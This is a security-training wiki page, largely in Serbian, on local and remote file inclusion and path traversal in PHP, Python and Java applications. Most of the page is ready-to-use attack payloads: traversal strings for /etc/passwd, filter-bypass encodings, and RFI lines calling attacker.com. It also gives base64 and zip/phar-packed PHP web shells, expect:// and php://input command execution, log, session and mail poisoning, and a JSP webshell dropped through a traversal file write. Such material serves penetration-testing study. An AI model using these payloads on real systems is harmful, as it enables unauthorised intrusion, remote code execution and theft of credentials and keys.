# File Inclusion/Path traversal

{{#include ../../banners/hacktricks-training.md}}

## File Inclusion

**Remote File Inclusion (RFI):** Fajl se učitava sa udaljenog servera (Best: You can write the code and the server will execute it). In php this is **disabled** by default (**allow_url_include**).\
**Local File Inclusion (LFI):** Server učitava lokalni fajl.

Ranljivost se javlja kada korisnik na neki način može da kontroliše fajl koji će server učitati.

Ranljive **PHP funkcije**: require, require_once, include, include_once

Zanimljiv alat za iskorišćavanje ove ranljivosti: [https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)

## Blind - Interesting - LFI2RCE fajlovi
```python
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
```
### **Linux**

**Kombinovanjem više \*nix LFI listi i dodavanjem dodatnih putanja napravio sam ovu:**


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt
{{#endref}}

Pokušajte takođe promeniti `/` u `\`\
Pokušajte takođe dodati `../../../../../`

Lista koja koristi nekoliko tehnika da pronađe fajl /etc/password (to check if the vulnerability exists) može se naći [here](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt)

### **Windows**

Spajanje različitih wordlists:


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt
{{#endref}}

Pokušajte takođe promeniti `/` u `\`\
Pokušajte takođe ukloniti `C:/` i dodati `../../../../../`

Lista koja koristi nekoliko tehnika da pronađe fajl /boot.ini (to check if the vulnerability exists) može se naći [here](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt)

### **OS X**

Proverite LFI listu za linux.

## Basic LFI and bypasses

Svi primeri su za Local File Inclusion, ali se takođe mogu primeniti na Remote File Inclusion (page=[http://myserver.com/phpshellcode.txt\\](<http://myserver.com/phpshellcode.txt)//>).
```
http://example.com/index.php?page=../../../etc/passwd
```
### traversal sequences uklonjene nerekurzivno
```python
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```
### **Null byte (%00)**

Bypass dodavanja dodatnih karaktera na kraj prosleđenog stringa (bypass of: $\_GET\['param']."php")
```
http://example.com/index.php?page=../../../etc/passwd%00
```
Ovo je **rešeno od PHP 5.4**

### **Kodiranje**

Možete koristiti nestandardna kodiranja kao što su double URL encode (i druga):
```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```
### Iz postojećeg foldera

Možda back-end proverava putanju foldera:
```python
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```
### Istraživanje direktorijuma fajl sistema na serveru

Fajl sistem servera može se rekurzivno istražiti kako bi se identifikovali direktorijumi, a ne samo fajlovi, primenom određenih tehnika. Ovaj proces uključuje utvrđivanje dubine direktorijuma i ispitivanje postojanja određenih foldera. Ispod je detaljna metoda za postizanje toga:

1. **Utvrdi dubinu direktorijuma:** Odredi dubinu trenutnog direktorijuma uspešnim dohvatanjem fajla `/etc/passwd` (primenljivo ako je server zasnovan na Linuxu). Primer URL-a može biti strukturiran na sledeći način, pokazujući dubinu od tri:
```bash
http://example.com/index.php?page=../../../etc/passwd # depth of 3
```
2. **Proverite direktorijume:** Dodajte ime sumnjenog direktorijuma (npr. `private`) u URL, zatim se vratite na `/etc/passwd`. Dodatni nivo direktorijuma zahteva povećanje dubine za jedan:
```bash
http://example.com/index.php?page=private/../../../../etc/passwd # depth of 3+1=4
```
3. **Tumačenje rezultata:** Odgovor servera ukazuje da li direktorijum postoji:
- **Greška / Nema izlaza:** Direktorijum `private` verovatno ne postoji na navedenoj lokaciji.
- **Sadržaj `/etc/passwd`:** Prisustvo direktorijuma `private` je potvrđeno.
4. **Rekurzivno istraživanje:** Otkrivene direktorijume je moguće dalje istraživati radi poddirektorijuma ili fajlova koristeći istu tehniku ili tradicionalne Local File Inclusion (LFI) metode.

Za istraživanje direktorijuma na drugim lokacijama u fajl sistemu, prilagodite payload u skladu sa tim. Na primer, da proverite da li `/var/www/` sadrži direktorijum `private` (pod pretpostavkom da je trenutni direktorijum na dubini 3), koristite:
```bash
http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd
```
### **Path Truncation Technique**

Path truncation je metoda koja se koristi za manipulaciju putanjama do fajlova u web aplikacijama. Često se koristi za pristup ograničenim fajlovima zaobiđući određene sigurnosne mere koje dodaju dodatne karaktere na kraj putanja. Cilj je kreirati putanju koja, nakon što je sigurnosna mera izmeni, i dalje pokazuje na željeni fajl.

U PHP-u, različite reprezentacije putanje do fajla mogu se smatrati ekvivalentnim zbog prirode fajl sistema. Na primer:

- `/etc/passwd`, `/etc//passwd`, `/etc/./passwd`, and `/etc/passwd/` svi se tretiraju kao ista putanja.
- Kada poslednjih 6 karaktera bude `passwd`, dodavanje `/` (praveći `passwd/`) ne menja ciljani fajl.
- Slično, ako je `.php` dodat na putanju (kao `shellcode.php`), dodavanje `/.` na kraju neće promeniti fajl kojem se pristupa.

Primeri ispod pokazuju kako koristiti path truncation za pristup `/etc/passwd`, čestom cilju zbog osetljivog sadržaja (informacije o korisničkim nalozima):
```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd......[ADD MORE]....
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.
```

```
http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
```
U ovim scenarijima, broj potrebnih traversals može biti oko 2027, ali taj broj može varirati u zavisnosti od konfiguracije servera.

- **Korišćenje dot segmenata i dodatnih karaktera**: Traversal sequences (`../`) u kombinaciji sa dodatnim dot segmentima i karakterima mogu se koristiti za navigaciju datotečnim sistemom, efikasno ignorisanjem nizova koje server dodaje na putanju.
- **Određivanje potrebnog broja '../' sekvenci**: Metodom pokušaja i grešaka može se pronaći tačan broj `../` sekvenci potreban da se dođe do korenskog direktorijuma, a zatim do `/etc/passwd`, pri čemu se osigurava da su svi pridodati nizovi (kao `.php`) neutralisani, dok željena putanja (`/etc/passwd`) ostane netaknuta.
- **Početak sa lažnim direktorijumom**: Uobičajena praksa je započeti putanju nepostojećim direktorijumom (npr. `a/`). Ova tehnika se koristi kao mera predostrožnosti ili da bi se ispunili zahtevi logike parsiranja putanja servera.

Primenjujući tehnike skraćivanja putanje, ključno je razumeti ponašanje parsiranja putanja od strane servera i strukturu datotečnog sistema. Svaki scenario može zahtevati drugačiji pristup, i često je potrebno testiranje kako bi se pronašla najefikasnija metoda.

**Ova ranjivost je ispravljena u PHP 5.3.**

### **Trikovi zaobilaženja filtera**
```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
http://example.com/index.php?page=PhP://filter
```
## Remote File Inclusion

U php-u je ovo onemogućeno podrazumevano zato što je **`allow_url_include`** **Off.** Mora biti **On** da bi radilo, i u tom slučaju možete uključiti PHP fajl sa vašeg servera i dobiti RCE:
```python
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```
Ako iz nekog razloga **`allow_url_include`** ima vrednost **On**, ali PHP **filtrira** pristup eksternim web stranicama, [prema ovom postu](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/), možete, na primer, iskoristiti data protocol sa base64 da dekodirate b64 PHP code i dobijete RCE:
```
PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt
```
> [!TIP]
> U prethodnom kodu, na kraju je dodat `+.txt` zato što je napadaču bio potreban string koji se završava sa `.txt`, pa se string završava tim i nakon b64 decode taj deo će vratiti samo beskoristan sadržaj, a pravi PHP kod će biti uključen (i samim tim, izvršen).

Još jedan primer **koji ne koristi `php://` protocol** bio bi:
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt
```
## Python korenski element

U Pythonu, u kodu kao što je ovaj:
```python
# file_name is controlled by a user
os.path.join(os.getcwd(), "public", file_name)
```
Ako korisnik prosledi **absolute path** u **`file_name`**, **prethodna putanja se jednostavno uklanja**:
```python
os.path.join(os.getcwd(), "public", "/etc/passwd")
'/etc/passwd'
```
To je predviđeno ponašanje u skladu sa [the docs](https://docs.python.org/3.10/library/os.path.html#os.path.join):

> Ako je komponenta apsolutna putanja, sve prethodne komponente se odbacuju i spajanje se nastavlja od apsolutne komponente putanje.

## Java listiranje direktorijuma

Izgleda da ako imate Path Traversal u Javi i **zatražite direktorijum** umesto fajla, **vraća se listiranje direktorijuma**. Ovo se neće dešavati u drugim jezicima (koliko ja znam).

## Top 25 parametara

Evo liste Top 25 parametara koji bi mogli biti ranjivi na local file inclusion (LFI) ranjivosti (iz [link](https://twitter.com/trbughunters/status/1279768631845494787)):
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```
## LFI / RFI using PHP wrappers & protocols

### php://filter

PHP filters omogućavaju izvođenje osnovnih **operacija modifikacije nad podacima** pre nego što budu pročitani ili upisani. Postoji 5 kategorija filtera:

- [String Filters](https://www.php.net/manual/en/filters.string.php):
- `string.rot13`
- `string.toupper`
- `string.tolower`
- `string.strip_tags`: Uklanja tagove iz podataka (sve između znakova "<" i ">")
- Imajte na umu da je ovaj filter nestao u modernim verzijama PHP-a
- [Conversion Filters](https://www.php.net/manual/en/filters.convert.php)
- `convert.base64-encode`
- `convert.base64-decode`
- `convert.quoted-printable-encode`
- `convert.quoted-printable-decode`
- `convert.iconv.*` : Transformiše u drugi encoding (`convert.iconv.<input_enc>.<output_enc>`). Da biste dobili **listu svih podržanih enkodinga** pokrenite u konzoli: `iconv -l`

> [!WARNING]
> Abusing the `convert.iconv.*` conversion filter you can **generate arbitrary text**, which could be useful to write arbitrary text or make a function like include process arbitrary text. For more info check [**LFI2RCE via php filters**](lfi2rce-via-php-filters.md).

- [Compression Filters](https://www.php.net/manual/en/filters.compression.php)
- `zlib.deflate`: Kompresuje sadržaj (korisno ako se eksfiltrira mnogo informacija)
- `zlib.inflate`: Dekompresuje podatke
- [Encryption Filters](https://www.php.net/manual/en/filters.encryption.php)
- `mcrypt.*` : Deprecated
- `mdecrypt.*` : Deprecated
- Ostali filteri
- Pokretanjem u php `var_dump(stream_get_filters());` možete pronaći par **neočekivanih filtera**:
- `consumed`
- `dechunk`: poništava HTTP chunked enkodiranje
- `convert.*`
```php
# String Filters
## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
echo file_get_contents("php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd");
## Same chain without the "|" char
echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
## string.string_tags example
echo file_get_contents("php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code; ?>lalalala");

# Conversion filter
## B64 decode
echo file_get_contents("php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=");
## Chain B64 encode and decode
echo file_get_contents("php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd");
## convert.quoted-printable-encode example
echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=data://plain/text,£hellooo=");
=C2=A3hellooo=3D
## convert.iconv.utf-8.utf-16le
echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");

# Compresion Filter
## Compress + B64
echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd");
readfile('php://filter/zlib.inflate/resource=test.deflated'); #To decompress the data locally
# note that PHP protocol is case-inselective (that's mean you can use "PhP://" and any other varient)
```
> [!WARNING]
> Deo "php://filter" nije osetljiv na velika i mala slova

### Korišćenje php filters kao oracle za čitanje proizvoljnih fajlova

[**U ovom postu**](https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle) je predložena tehnika za čitanje lokalnog fajla bez vraćanja output-a sa servera. Ova tehnika se zasniva na **boolean exfiltration of the file (char by char) using php filters** kao oracle. To je zato što se php filters mogu koristiti da učine tekst dovoljno velikim da php baci izuzetak.

U originalnom postu možete naći detaljno objašnjenje tehnike, ali evo kratkog rezimea:

- Koristite codec **`UCS-4LE`** da ostavite vodeći karakter teksta na početku i da veličina stringa raste eksponencijalno.
- Ovo će se koristiti da se generiše **tekst toliko veliki da, ako je početno slovo pogođeno**, php će izazvati **grešku**.
- Filter **dechunk** će **obrisati sve ako prvi char nije heksadecimalan**, pa možemo znati da li je prvi char hex.
- Ovo, u kombinaciji sa prethodnim (i drugim filterima u zavisnosti od pogođenog slova), će nam omogućiti da pogodimo slovo na početku teksta tako što ćemo primetiti kada obavimo dovoljno transformacija da ono prestane biti heksadecimalni karakter. Jer ako je hex, dechunk ga neće obrisati i početna bomba će izazvati php grešku.
- Codec **convert.iconv.UNICODE.CP930** transformiše svako slovo u sledeće (npr. a -> b). Ovo nam omogućava da otkrijemo da li je početno slovo `a`, na primer, jer ako primenimo 6 puta ovaj codec: a->b->c->d->e->f->g, slovo više nije heksadecimalni karakter, stoga dechunk ga neće obrisati i php greška će biti pokrenuta zato što se množi sa početnom bombom.
- Korišćenjem drugih transformacija kao što je **rot13** na početku moguće je leak-ovati druga slova kao što su n, o, p, q, r (i drugi codecs se mogu koristiti da pomere druga slova u hex opseg).
- Kada je početni karakter broj, potrebno ga je base64 enkodovati i leak-ovati prva 2 slova da bismo leak-ovali broj.
- Konačni problem je kako leak-ovati više od početnog slova. Korišćenjem filtera koji menjaju redosled bajtova kao što su **convert.iconv.UTF16.UTF-16BE, convert.iconv.UCS-4.UCS-4LE, convert.iconv.UCS-4.UCS-4LE** moguće je promeniti redosled karaktera i dovesti u prvu poziciju druga slova iz teksta.
- I da bismo mogli dobiti further data, ideja je da se generišu 2 bajta junk podataka na početku pomoću **convert.iconv.UTF16.UTF16**, primeni **UCS-4LE** da se oni pivotuju sa naredna 2 bajta, i obrišu podaci sve dok ne stignemo do junk podataka (ovo će ukloniti prva 2 bajta početnog teksta). Nastaviti ovo dok ne dođete do željenog bita za leak.

U postu je takođe leaked alat za automatsko izvođenje: [php_filters_chain_oracle_exploit](https://github.com/synacktiv/php_filter_chains_oracle_exploit).

### php://fd

Ovaj wrapper omogućava pristup file descriptors koje proces ima otvorene. Potencijalno korisno za exfiltrate the content of opened files:
```php
echo file_get_contents("php://fd/3");
$myfile = fopen("/etc/passwd", "r");
```
Takođe možete koristiti **php://stdin, php://stdout i php://stderr** da pristupite **deskriptorima fajlova 0, 1 i 2** respektivno (nisam siguran kako bi ovo moglo biti korisno u napadu)

### zip:// and rar://

Otpremite Zip ili Rar fajl sa PHPShell-om unutra i pristupite mu.\
Da biste mogli zloupotrebiti rar protokol, **potrebno je da bude posebno aktiviran**.
```bash
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php

# To compress with rar
rar a payload.rar payload.php;
mv payload.rar shell.jpg;
rm payload.php
http://example.com/index.php?page=rar://shell.jpg%23payload.php
```
### data://
```
http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
Imajte na umu da je ovaj protokol ograničen php konfiguracijama **`allow_url_open`** i **`allow_url_include`**

### expect://

Expect mora biti aktiviran. Možete izvršiti kod koristeći ovo:
```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```
### input://

Navedite svoj payload u POST parametrima:
```bash
curl -XPOST "http://example.com/index.php?page=php://input" --data "<?php system('id'); ?>"
```
### phar://

A `.phar` fajl može da se iskoristi za izvršavanje PHP koda kada web aplikacija koristi funkcije kao što su `include` za učitavanje fajlova. PHP primer koda ispod pokazuje kreiranje `.phar` fajla:
```php
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); system("ls"); ?>');
$phar->stopBuffering();
```
Da biste kompajlirali `.phar` fajl, izvršite sledeću komandu:
```bash
php --define phar.readonly=0 create_path.php
```
Upon execution, a file named `test.phar` will be created, which could potentially be leveraged to exploit Local File Inclusion (LFI) vulnerabilities.

In cases where the LFI only performs file reading without executing the PHP code within, through functions such as `file_get_contents()`, `fopen()`, `file()`, `file_exists()`, `md5_file()`, `filemtime()`, or `filesize()`, exploitation of a deserialization vulnerability could be attempted. This vulnerability is associated with the reading of files using the `phar` protocol.

For a detailed understanding of exploiting deserialization vulnerabilities in the context of `.phar` files, refer to the document linked below:

[Phar Deserialization Exploitation Guide](phar-deserialization.md)


{{#ref}}
phar-deserialization.md
{{#endref}}

### CVE-2024-2961

Bilo je moguće zloupotrebiti **bilo koje proizvoljno čitanje fajla iz PHP-a koje podržava php filters** da bi se dobio RCE. The detailed description can be [**found in this post**](https://www.ambionics.io/blog/iconv-cve-2024-2961-p1)**.**\
Veoma kratak rezime: iskorišćen je **3 byte overflow** u PHP heap-u da bi se **alter the chain of free chunks** određene veličine kako bi se moglo **write anything in any address**, pa je dodat hook koji poziva **`system`**.\
Bilo je moguće alocirati chunk-ove specifičnih veličina zloupotrebom više php filters.

### More protocols

Check more possible[ **protocols to include here**](https://www.php.net/manual/en/wrappers.php)**:**

- [php://memory and php://temp](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.memory) — Piše u memoriju ili u privremenu datoteku (not sure how this can be useful in a file inclusion attack)
- [file://](https://www.php.net/manual/en/wrappers.file.php) — Pristup lokalnom fajlsistemu
- [http://](https://www.php.net/manual/en/wrappers.http.php) — Pristup HTTP(s) URL-ovima
- [ftp://](https://www.php.net/manual/en/wrappers.ftp.php) — Pristup FTP(s) URL-ovima
- [zlib://](https://www.php.net/manual/en/wrappers.compression.php) — Kompresioni streamovi
- [glob://](https://www.php.net/manual/en/wrappers.glob.php) — Pronalazi putanje koje odgovaraju obrascu (It doesn't return nothing printable, so not really useful here)
- [ssh2://](https://www.php.net/manual/en/wrappers.ssh2.php) — Secure Shell 2
- [ogg://](https://www.php.net/manual/en/wrappers.audio.php) — Audio streams (Not useful to read arbitrary files)

## LFI via PHP's 'assert'

Rizik od Local File Inclusion (LFI) u PHP-u je naročito visok kada se radi sa 'assert' funkcijom, koja može izvršavati kod unutar stringova. Ovo je posebno problematično ako se ulaz koji sadrži directory traversal karaktere kao što su ".." proverava, ali nije pravilno očišćen.

For example, PHP code might be designed to prevent directory traversal like so:
```bash
assert("strpos('$file', '..') === false") or die("");
```
Iako je cilj da se spreči traversal, to nenamerno stvara vektor za code injection. Da bi iskoristio ovo za čitanje sadržaja fajlova, napadač bi mogao koristiti:
```plaintext
' and die(highlight_file('/etc/passwd')) or '
```
Slično tome, za izvršavanje proizvoljnih sistemskih komandi, može se koristiti:
```plaintext
' and die(system("id")) or '
```
Važno je **URL-encode these payloads**.

## PHP Blind Path Traversal

> [!WARNING]
> Ova tehnika je relevantna u slučajevima kada vi **kontrolišete** **putanju fajla** od **PHP funkcije** koja će **pristupiti fajlu**, ali nećete videti sadržaj fajla (kao jednostavan poziv **`file()`**) jer sadržaj nije prikazan.

U [**this incredible post**](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html) je objašnjeno kako se blind path traversal može zloupotrebiti putem PHP filtera da **exfiltrate the content of a file via an error oracle**.

Kao rezime, tehnika koristi **"UCS-4LE" encoding** da bi sadržaj fajla postao toliko **velik** da će **PHP funkcija koja otvara** fajl pokrenuti **error**.

Zatim, za leak prvog karaktera, filter **`dechunk`** se koristi zajedno sa drugim kao što su **base64** ili **rot13**, i na kraju se koriste filteri **convert.iconv.UCS-4.UCS-4LE** i **convert.iconv.UTF16.UTF-16BE** da bi se postavili drugi karakteri na početak i izazvao leak.

**Funkcije koje mogu biti ranjive**: `file_get_contents`, `readfile`, `finfo->file`, `getimagesize`, `md5_file`, `sha1_file`, `hash_file`, `file`, `parse_ini_file`, `copy`, `file_put_contents (only target read only with this)`, `stream_get_contents`, `fgets`, `fread`, `fgetc`, `fgetcsv`, `fpassthru`, `fputs`

Za tehničke detalje pogledajte pomenuti post!

## LFI2RCE

### Arbitrary File Write via Path Traversal (Webshell RCE)

Kada server-side kod koji prihvata/otpremi fajlove gradi destinacionu putanju koristeći podatke pod kontrolom korisnika (npr. filename ili URL) bez canonicalising i validacije, `..` segmenti i apsolutne putanje mogu pobeći iz nameravane direktorijuma i prouzrokovati arbitrary file write. Ako možete smestiti payload u web-exposed direktorijum, obično dobijete unauthenticated RCE tako što ubacite webshell.

Typical exploitation workflow:
- Identifikujte write primitive u endpointu ili background workeru koji prihvata putanju/ime fajla i upisuje sadržaj na disk (npr. message-driven ingestion, XML/JSON command handlers, ZIP extractors, itd.).
- Odredite web-exposed direktorijume. Uobičajeni primeri:
- Apache/PHP: `/var/www/html/`
- Tomcat/Jetty: `<tomcat>/webapps/ROOT/` → drop `shell.jsp`
- IIS: `C:\inetpub\wwwroot\` → drop `shell.aspx`
- Napravite traversal putanju koja izlazi iz predviđenog direktorijuma za skladištenje u webroot, i uključite sadržaj vašeg webshell-a.
- Posetite ubačeni payload i izvršite komande.

Napomene:
- Usluga koja vrši upis može slušati na non-HTTP portu (npr. JMF XML listener na TCP 4004). Glavni web portal (na drugom portu) će kasnije servirati vaš payload.
- Na Java stackovima, ovi upisi fajlova se često implementiraju prostom `File`/`Paths` konkatenacijom. Nedostatak canonicalisation/allow-listing je osnovni propust.

Generic XML/JMF-style example (product schemas vary – the DOCTYPE/body wrapper is irrelevant for the traversal):
```xml
<?xml version="1.0" encoding="UTF-8"?>
<JMF SenderID="hacktricks" Version="1.3">
<Command Type="SubmitQueueEntry">
<!-- Write outside the intake folder into the webroot via traversal -->
<Resource Name="FileName">../../../webapps/ROOT/shell.jsp</Resource>
<Data>
<![CDATA[
<%@ page import="java.io.*" %>
<%
String c = request.getParameter("cmd");
if (c != null) {
Process p = Runtime.getRuntime().exec(c);
try (var in = p.getInputStream(); var out = response.getOutputStream()) {
in.transferTo(out);
}
}
%>
]]>
</Data>
</Command>
</JMF>
```
Hardening that defeats this class of bugs:
- Resolvuј do kanonske putanje i osiguraj da je potomak baze direktorijuma na listi dozvoljenih.
- Odbaci svaku putanju koja sadrži `..`, apsolutne root putanje, ili drive letters; preferiraj generisane nazive fajlova.
- Pokreni proces za upis kao nalog sa niskim privilegijama i odvoji direktorijume za pisanje od direktorijuma koji se služe.

## Remote File Inclusion

Explained previously, [**follow this link**](#remote-file-inclusion).

### Via Apache/Nginx log file

If the Apache or Nginx server is **vulnerable to LFI** inside the include function you could try to access to **`/var/log/apache2/access.log` or `/var/log/nginx/access.log`**, set inside the **user agent** or inside a **GET parameter** a php shell like **`<?php system($_GET['c']); ?>`** and include that file

> [!WARNING]
> Note that **if you use double quotes** for the shell instead of **simple quotes**, the double quotes will be modified for the string "_**quote;**_", **PHP will throw an error** there and **nothing else will be executed**.
>
> Also, make sure you **write correctly the payload** or PHP will error every time it tries to load the log file and you won't have a second opportunity.

This could also be done in other logs but **be careful,** the code inside the logs could be URL encoded and this could destroy the Shell. The header **authorisation "basic"** contains "user:password" in Base64 and it is decoded inside the logs. The PHPShell could be inserted inside this header.\
Other possible log paths:
```python
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
```
Fuzzing wordlist: [https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

### Putem e-pošte

**Pošaljite mejl** na interni nalog (user@localhost) koji sadrži vaš PHP payload kao `<?php echo system($_REQUEST["cmd"]); ?>` i pokušajte da uključite mail korisnika putem puta kao **`/var/mail/<USERNAME>`** ili **`/var/spool/mail/<USERNAME>`**

### Putem /proc/\*/fd/\*

1. Otpremite mnogo shells (na primer : 100)
2. Uključite [http://example.com/index.php?page=/proc/$PID/fd/$FD](http://example.com/index.php?page=/proc/$PID/fd/$FD), pri čemu je $PID = PID procesa (može se brute-force-ovati) a $FD je file descriptor (može se brute-force-ovati takođe)

### Putem /proc/self/environ

Poput log fajla, pošaljite payload u User-Agent; biće reflektovano unutar /proc/self/environ fajla
```
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```
### Putem upload

Ako možete uploadovati fajl, jednostavno ubacite shell payload u njega (npr: `<?php system($_GET['c']); ?>`).
```
http://example.com/index.php?page=path/to/uploaded/file.png
```
Da bi datoteka bila čitljiva, najbolje je ubaciti u metadata slika/doc/pdf

### Putem ZIP file upload

Otpremite ZIP datoteku koja sadrži kompresovani PHP shell i pristupite:
```python
example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
```
### Putem PHP sessions

Proverite da li sajt koristi PHP Session (PHPSESSID)
```
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```
U PHP-u ove sesije se čuvaju u _/var/lib/php5/sess\\_\[PHPSESSID]\_ fajlovima
```
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```
Postavite cookie na `<?php system('cat /etc/passwd');?>`
```
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```
Iskoristite LFI da uključite PHP session file.
```
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2
```
### Preko ssh

Ako je ssh aktivan, proverite koji korisnik se koristi (/proc/self/status & /etc/passwd) i pokušajte da pristupite **\<HOME>/.ssh/id_rsa**

### **Preko** **vsftpd** _**logova**_

Logovi za FTP server vsftpd se nalaze na _**/var/log/vsftpd.log**_. U scenariju gde postoji Local File Inclusion (LFI) ranjivost i pristup izloženom vsftpd serveru je moguć, sledeći koraci se mogu razmotriti:

1. Injektujte PHP payload u polje za korisničko ime tokom procesa prijave.
2. Nakon injektovanja, iskoristite LFI da preuzmete logove servera iz _**/var/log/vsftpd.log**_.

### Preko php base64 filtera (koristeći base64)

Kao što je prikazano u [this](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64) article, PHP base64 filter jednostavno ignoriše ne-base64 podatke. To možete iskoristiti da zaobiđete proveru ekstenzije fajla: ako obezbedite base64 koji se završava sa ".php", filter će jednostavno ignorisati "." i dodati "php" na base64. Evo primera payload-a:
```url
http://example.com/index.php?page=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.php

NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
### Putem php filters (nije potreban fajl)

Ovaj [**writeup** ](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d) objašnjava da možete koristiti **php filters za generisanje proizvoljnog sadržaja** kao izlaz. Što u suštini znači da možete **generisati proizvoljan php code** za include **bez potrebe da ga zapisujete** u fajl.


{{#ref}}
lfi2rce-via-php-filters.md
{{#endref}}

### Putem segmentation fault

**Otpremite** fajl koji će biti sačuvan kao **privremen** u `/tmp`, zatim u **istom zahtevu** izazovite **segmentation fault**, i onda taj **privremeni fajl neće biti obrisan** i možete ga potražiti.


{{#ref}}
lfi2rce-via-segmentation-fault.md
{{#endref}}

### Putem Nginx temp file storage

Ako pronađete **Local File Inclusion** i **Nginx** radi ispred PHP, možda ćete moći dobiti RCE sledećom tehnikom:


{{#ref}}
lfi2rce-via-nginx-temp-files.md
{{#endref}}

### Putem PHP_SESSION_UPLOAD_PROGRESS

Ako pronađete **Local File Inclusion** čak i ako **nemate sesiju** i `session.auto_start` je `Off`. Ako dostavite **`PHP_SESSION_UPLOAD_PROGRESS`** u **multipart POST** podacima, PHP će **omogućiti sesiju za vas**. Ovo možete iskoristiti da dobijete RCE:


{{#ref}}
via-php_session_upload_progress.md
